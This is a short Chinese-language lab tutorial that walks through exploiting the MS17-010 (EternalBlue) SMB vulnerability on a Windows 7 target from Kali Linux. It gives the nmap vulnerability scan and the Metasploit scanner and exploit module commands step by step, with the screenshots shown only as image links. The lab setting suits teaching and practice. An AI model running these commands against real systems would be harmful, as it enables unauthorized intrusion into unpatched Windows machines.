实验环境：

攻击机：kali Linux  IP地址：192.168.1.110

靶机： Windows7   IP地址：192.168.1.109

漏洞利用名称：ms17-010（永恒之蓝）

实验步骤：

首先通过nmap工具扫描靶机上存在的漏洞

msfconsole

nmap --script=vuln 192.168.1.109(靶机地址）  

![](../Images/a696bdb0a8ffc0ea05b0bded57978087.png)

通过扫描发现靶机存在三个漏洞，我们今天要利用的就是其中的一个ms17-010

然后加载漏洞脚本

use  auxiliary/scanner/smb/smb\_ms17\_010

设置被攻击对象的地址

       set RHOSTS 192.168.1.109

查看对应的端口和地址是否加载正常  

show options

![](../Images/ab4d4d825d064801f3e9526f985abaa2.png)

主要查看RHOSTS和RPORT是不是你设置的靶机的地址和445端口，永恒之蓝主要就是通过445端口进行入侵的。

检测能否利用

run   如图所示即可入侵

![](../Images/4d65798001f73a24a1edb186db3b06a3.png)

use  exploit/windows/smb/ms17\_010\_eternalblue

show options

set RHOST 192.168.1.109(被攻击者地址）

开始攻击

exploit （或者用run也可）

![](../Images/6726927435d15591b7b4d2ddf0082d88.png)
